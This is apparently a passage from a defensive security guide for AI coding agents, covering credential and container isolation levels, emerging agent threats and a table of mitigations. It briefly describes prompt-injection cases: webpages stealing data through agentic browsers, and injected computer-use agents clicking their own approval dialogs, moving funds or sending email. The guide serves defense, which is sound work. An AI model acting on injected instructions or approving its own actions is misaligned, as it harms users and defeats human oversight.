### Level 3: Credential Isolation (1 day)

Secrets never touch the agent's environment. The agent authenticates through a proxy that holds no credentials in memory.

- Migrate from `.env` files to a credential proxy or vault (HashiCorp Vault, 1Password CLI, `rbw`)
- Agent processes run in a separate user account or namespace
- Network egress is restricted — agent can only reach approved domains
- MCP servers run in isolated processes with minimal filesystem access
- Git SSH keys are scoped per-repository using `includeIf`

**You are protected against:** Environment variable leakage, file-based secret theft, cross-project credential access.

**You are NOT protected against:** Container escape exploits, kernel-level attacks, compromised API providers.

### Level 4: Full Container Isolation (1-2 days)

The agent runs in a sandboxed container with no access to your host filesystem or network.

- Agent runs in Docker/Podman container, gVisor, or Kata Container with read-only host mounts
- Network access via explicit proxy with domain allowlist
- Credential proxy runs on host; agent requests credentials via API with per-request approval
- Separate containers per project — no cross-project contamination
- Filesystem is ephemeral — destroyed after each session
- All agent actions logged and auditable outside the container

**You are protected against:** All known attack vectors documented in this threat model, assuming the container runtime itself is not compromised.

**Trade-offs:** Higher setup complexity, slower agent startup, friction when the agent needs access to new resources.

---

## What's Coming

Threats on the horizon as agents get more capable:

### Browser Agents (Active threat — 2025-2026)
Agents that browse the web on your behalf reintroduce XSS and CSRF attack patterns. Trail of Bits demonstrated that agentic browsers lack Same-Origin Policy equivalents — a single malicious webpage can steal data from any site the user is logged into. As agents gain browser access (Claude Code's WebFetch, Cursor's browser tools), every website becomes a potential prompt injection vector.

### Multi-Agent Systems (Emerging — 2026)
When multiple agents collaborate, a single compromised agent can poison the entire chain. Galileo AI found that cascading failures propagate through agent networks — 87% of downstream decision-making poisoned within 4 hours of a single agent compromise. As orchestration frameworks (LangGraph, CrewAI, AutoGen) proliferate, the inter-agent trust boundary becomes the new attack surface.

### File System Agents with Persistent Access (Emerging — 2026)
Agents with continuous filesystem access (background indexing, always-on assistants) create persistent attack surfaces. SpAIware-style memory poisoning means a single bad interaction can corrupt agent behavior indefinitely. Unlike session-based agents, persistent agents carry their compromised state forward.

### Computer Use Agents (Near-term — 2026)
Agents that control mouse and keyboard (Anthropic's computer use, OpenAI's Operator) have the full capabilities of a human operator. A prompt injection to a computer-use agent can click "Approve" on its own dialogs, transfer funds, send emails, or modify system settings. The approval model breaks down completely when the agent controls the approval mechanism.

### AI-Generated Supply Chain Attacks (Active threat — 2026)
As AI tools generate more code, attackers use AI to generate sophisticated-looking but subtly vulnerable code at scale. The dependency hallucination problem (~20% of AI-generated packages reference non-existent packages) creates a window for package name squatting attacks. Already confirmed: malicious actors registering hallucinated package names on npm and PyPI.

### Autonomous Long-Running Agents (Near-term — 2026)
Agents that run for hours or days without human checkpoints have no meaningful human oversight. If compromised at hour 1, they operate with full capabilities for the remaining duration. Current monitoring tools are not designed for long-running autonomous sessions.

---

## Mitigation Map

| Threat Category | Primary Mitigation | Guide |
|----------------|-------------------|-------|
| Prompt Injection (ASI01) | PreToolUse hooks, file deny rules, input sanitization | [Claude Code Hardening](hardening/claude-code.md) |
| Tool Misuse (ASI02) | Permission allowlists (not blocklists), hook-based firewalls | [Claude Code Hardening](hardening/claude-code.md) |
| Privilege Abuse (ASI03) | Credential proxy, vault-based secrets, no env vars | [Credential Management](credential-management.md) |
| Supply Chain (ASI04) | MCP server pinning, agent-scan, skill auditing, provenance verification, SHA-pinned Actions | [Supply Chain Defense](supply-chain-defense.md) |
| Code Execution (ASI05) | Sandbox enforcement, Workspace Trust, no `--dangerously-skip-permissions` | [Cursor Hardening](hardening/cursor.md) |
| Context Poisoning (ASI06) | Audit `CLAUDE.md` in cloned repos, memory hygiene, deny-rule validation | [Claude Code Hardening](hardening/claude-code.md) |
| Inter-Agent Comms (ASI07) | Isolate MCP servers, minimal tool exposure, pin server versions | [References](references.md) |
| Cascading Failures (ASI08) | Immutable shell configs, git hook protection, session isolation | [Quick Start](guides/quick-start.md) |
| Trust Exploitation (ASI09) | Never use `--dangerously-skip-permissions`, review every call, enable Workspace Trust | [Claude Code Hardening](hardening/claude-code.md) |
| Rogue Agents (ASI10) | Audit logging, session time limits, checkpoints, container isolation | [Quick Start](guides/quick-start.md) |

## What To Do Next

1. **Right now** — Follow the [Quick Start Guide](guides/quick-start.md) (30 minutes)
2. **This week** — Read the hardening guide for your primary agent ([Claude Code](hardening/claude-code.md), [Cursor](hardening/cursor.md), [Windsurf](hardening/windsurf.md))
3. **This month** — Migrate from env vars to a credential proxy ([Credential Management](credential-management.md))
4. **This quarter** — Progress through the [Agent Security Maturity Model](#agent-security-maturity-model) to at least Level 2
5. **Ongoing** — Review the [References](references.md) collection as new tools and research emerge

---

*Last updated: April 2026. Sources verified at time of writing. If a link is dead, check the [Wayback Machine](https://web.archive.org/) or search for the title.*
